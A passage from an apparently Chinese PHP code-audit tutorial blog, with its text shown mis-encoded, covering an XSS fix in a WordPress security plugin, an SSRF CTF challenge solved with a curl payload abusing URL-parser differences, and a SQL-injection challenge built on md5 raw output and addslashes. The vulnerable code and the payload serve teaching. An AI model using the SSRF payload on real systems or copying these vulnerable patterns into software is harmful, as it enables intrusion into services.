class="variable">$wp_filter</span>[<span class="variable">$tag</span>]-&gt;<span class="title function_ invoke__">do_action</span>();</span><br><span class="line">    <span class="title function_ invoke__">array_pop</span>(<span class="variable">$wp_current_filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wp-includes/class-wp-hook.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_action</span>(<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;nesting_level) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;doing_action = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶å <strong>apply_filters</strong> æ–¹æ³•è°ƒç”¨äº† <strong>wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-admin-init.php</strong> æ–‡ä»¶çš„ <strong>handle_dashboard_menu_rendering</strong> æ–¹æ³•ï¼Œå¹¶å®ä¾‹åŒ–äº†ä¸€ä¸ª <strong>AIOWPSecurity_Dashboard_Menu</strong> å¯¹è±¡ã€‚</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-5.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¼€å¤´æ–‡ç« åˆ†æçš„éƒ¨åˆ†</p><p>æ•´ä¸ªæ¼æ´çš„æ”»å‡»é“¾å°±å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-6.png"></p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹è¦æé†’å¤§å®¶çš„æ˜¯ï¼Œæ¡ˆä¾‹ä¸­ <strong>$_REQUEST[â€œtabâ€]</strong> æœ€åå–åˆ°çš„æ˜¯ <strong>$_POST[â€œtabâ€]</strong> çš„å€¼ï¼Œè€Œä¸æ˜¯ <strong>$_GET[â€œtabâ€]</strong> å˜é‡çš„å€¼ã€‚è¿™å…¶å®å’Œ <strong>php.ini</strong> ä¸­çš„ <strong>request_order</strong> å¯¹åº”çš„å€¼æœ‰å…³ã€‚ä¾‹å¦‚åœ¨æˆ‘çš„ç¯å¢ƒä¸­ï¼Œ <strong>request_order</strong> é…ç½®å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-7.png"></p><p>è¿™é‡Œçš„ <strong>â€œGPâ€</strong> è¡¨ç¤ºçš„æ˜¯ <strong>GET</strong> å’Œ <strong>POST</strong> ï¼Œä¸”é¡ºåºä»å·¦å¾€å³ã€‚ä¾‹å¦‚æˆ‘ä»¬åŒæ—¶ä»¥ <strong>GET</strong> å’Œ <strong>POST</strong> æ–¹å¼ä¼ è¾“ <strong>tab</strong> å˜é‡ï¼Œé‚£ä¹ˆæœ€ç»ˆç”¨ <strong>$_REQUEST[â€˜tabâ€™]</strong> è·å–åˆ°çš„å°±æ˜¯ <strong>$_POST[â€˜tabâ€™]</strong> çš„å€¼ã€‚æ›´è¯¦ç»†çš„ä»‹ç»å¯ä»¥çœ‹å¦‚ä¸‹PHPæ‰‹å†Œçš„å®šä¹‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request_order <span class="keyword">string</span></span><br><span class="line">This directive describes the order in which PHP registers GET, POST <span class="keyword">and</span> Cookie variables into the _REQUEST <span class="keyword">array</span>. Registration is done <span class="keyword">from</span> left to right, newer values override older values.</span><br><span class="line"></span><br><span class="line">If this directive is not set, variables_order is used <span class="keyword">for</span> <span class="variable">$_REQUEST</span> contents.</span><br><span class="line"></span><br><span class="line">Note that the <span class="keyword">default</span> distribution php.ini files does not contain the <span class="string">&#x27;C&#x27;</span> <span class="keyword">for</span> cookies, due to security concerns.</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤å»ºè®®-1"><a href="#ä¿®å¤å»ºè®®-1" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>å¯¹äºè¿™ä¸ªæ¼æ´çš„ä¿®å¤æ–¹æ¡ˆï¼Œæˆ‘ä»¬åªè¦ä½¿ç”¨è¿‡æ»¤åçš„ <strong>$tab</strong> å˜é‡å³å¯ï¼Œä¸”å˜é‡æœ€å¥½ç»è¿‡HTMLå®ä½“ç¼–ç åå†è¾“å‡ºï¼Œä¾‹å¦‚ä½¿ç”¨ <strong>htmlentities</strong> å‡½æ•°ç­‰ã€‚</p><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])&#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;real_ip&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">0</span>] AS <span class="variable">$xip</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(10|172\.16|192\.168)\.#&#x27;</span>, <span class="variable">$xip</span>)) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$xip</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rip</span> = <span class="title function_ invoke__">real_ip</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rip</span> === <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;HRCTF&#123;SSRF_can_give_you_flag&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You IP is <span class="subst">&#123;$rip&#125;</span> not 127.0.0.1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Day16çš„CTFè€ƒå¯Ÿçš„æ˜¯ SSRFæ¼æ´ ï¼Œ flag åªæœ‰é€šè¿‡ 127.0.0.1 çš„IPå»è¯·æ±‚ flag.php æ–‡ä»¶ï¼Œæ‰èƒ½è·å¾—flagã€‚å¯ä»¥çœ‹åˆ°ç¨‹åºå¯¹ç”¨æˆ·ä¼ æ¥çš„æ•°æ®ï¼Œä¼šå…ˆä½¿ç”¨ safe_request_url å‡½æ•°å¯¹URLçš„åˆæ³•æ€§è¿›è¡Œåˆ¤æ–­ã€‚è€Œåœ¨ safe_request_url å‡½æ•°ä¸­ï¼Œä½¿ç”¨ check_inner_ip å‡½æ•°åˆ¤æ–­ç”¨æˆ·è¯·æ±‚çš„IPæ˜¯å¦ä¸ºå†…éƒ¨IPåœ°å€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ‹’ç»è¯¥è¯·æ±‚ï¼›å¦åˆ™ä½¿ç”¨curlè¿›è¡Œè¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚ç»“æœè¿›è¡Œè¾“å‡ºã€‚å¯¹äºè¿™ä¸€çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages<br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-8.png"><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨URLè§£æå™¨ä¹‹é—´çš„å·®å¼‚å¤„ç†ï¼Œæ„é€ å¦‚ä¸‹ payload ï¼š<br><code>curl -d &quot;url=http://foo@localhost:80@www.freebuf.com/flag.php&quot; &quot;http://é¢˜ç›®IP/&quot;</code><br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-9.png"></p><h2 id="Day-17-Turkey-Baster"><a href="#Day-17-Turkey-Baster" class="headerlink" title="Day 17 - Turkey Baster"></a>Day 17 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;password=&#x27;<span class="subst">$pass</span>&#x27; AND user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">RealSecureLoginManager</span>(</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å®é™…ä¸Šå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æ <strong>Day13</strong> å¾ˆç›¸ä¼¼ï¼Œä» <strong>ç¬¬17è¡Œ-20è¡Œ</strong> ä»£ç ä¸­æ˜æ˜¾å­˜åœ¨SQLè¯­å¥æ‹¼æ¥çš„å½¢å¼ï¼Œè€Œ <strong>$pass</strong> å˜é‡å’Œ <strong>$user</strong> å˜é‡æ˜¯åœ¨ <strong>ç¬¬30è¡Œå’Œ31è¡Œ</strong> ä¸­é€šè¿‡ <strong>POST</strong> æ–¹å¼ç”±ç”¨æˆ·è¿›è¡Œæ§åˆ¶ã€‚è¿™é‡Œå¾ˆæ˜æ˜¾å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯è€ƒå¯ŸSQLæ³¨å…¥æ¼æ´ã€‚</p><p>è¿™é‡Œä¸ºä»€ä¹ˆè¯´è¿™é¢˜å’Œ <strong>Day13</strong> å¾ˆç›¸ä¼¼å‘¢ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ã€‚ç¨‹åºä»£ç  <strong>ç¬¬14è¡Œ</strong> è°ƒç”¨ <strong>sanitizeInput</strong> å‡½æ•°é’ˆå¯¹ç”¨æˆ·è¾“å…¥çš„ <strong>$user</strong> å˜é‡è¿›è¡Œäº†å¤„ç†ï¼Œè·Ÿè¿›ä¸€ä¸‹ <strong>sanitizeInput</strong> å‡½æ•°ï¼Œåœ¨ <strong>ç¬¬25è¡Œ</strong> æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯è°ƒç”¨ <strong>addslashes</strong> å‡½æ•°é’ˆå¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¤„ç†ã€‚ <strong>addslashes</strong> å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šåœ¨å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆ <strong>NULL</strong> å­—ç¬¦ï¼‰å­—ç¬¦ä¹‹å‰åŠ ä¸Šåæ–œçº¿ã€‚</p></blockquote><p>æ‰€ä»¥æŒ‰ç…§è¿™ç§æƒ…å†µä¸‹è¿™ä¸ªåœ°æ–¹ï¼Œä¼¼ä¹ä¸å­˜åœ¨æ³¨å…¥ç‚¹äº†ï¼Œå…ˆåˆ«æ€¥ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œæˆ‘ä»¬çœ‹åˆ° <strong>ç¬¬13è¡Œ</strong> ä»£ç é’ˆå¯¹ç”¨æˆ·è¾“å…¥ <strong>password</strong> çš„å€¼è°ƒç”¨ <strong>md5</strong> å‡½æ•°è¿›è¡Œç›¸å…³å¤„ç†ã€‚æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹è¿™ä¸ª <strong>md5</strong> å‡½æ•°</p><blockquote><p><a href="http://php.net/manual/zh/function.md5.php">md5</a> â€” è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬çœ‹åˆ°é¢˜ç›®ä¸­çš„ä»£ç æ˜¯è¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨ <strong>$raw_output</strong> ä½ç½®è®¾ç½®ä¸ºäº†trueï¼Œæ ¹æ®æè¿°</p><blockquote><p>å¦‚æœå¯é€‰çš„ <code>raw_output</code> è¢«è®¾ç½®ä¸º <strong>TRUE</strong>ï¼Œé‚£ä¹ˆ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</p></blockquote><p>é‚£æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ•ˆæœ</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-10.png"></p><p>ç°åœ¨æ•´ç†ä¸€ä¸‹è¿™é“é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘å¯ä»¥æ§åˆ¶çš„ç‚¹æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯ <strong>$user</strong> ï¼Œä¸€ä¸ªæ˜¯ <strong>$pass</strong> ï¼Œ**$pass** ç»è¿‡äº† <strong>md5</strong> çš„å¤„ç†ï¼Œä½†æ˜¯è¿”å›å­—æ®µä¸æ˜¯æ ‡å‡†çš„md5å€¼ï¼Œ**$user** ç»è¿‡äº† <strong>addslashes</strong> å‡½æ•°çš„å¤„ç†ï¼Œæ— æ³•å¼•å…¥ç‰¹æ®Šç¬¦å·å»é—­åˆã€‚è¿™é‡Œåšä¸ªå‡è®¾ï¼Œå¦‚æœæˆ‘ä»¬ç»è¿‡ <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> å¤„ç†ä¹‹åçš„å€¼é€ƒé€¸å‡ºä¸€ä¸ªåæ–œæ†ï¼Œé‚£ä¹ˆå®é™…ä¸Šå¸¦å…¥åˆ°æ•°æ®åº“çš„å€¼å°±å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;xxxxxx\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span 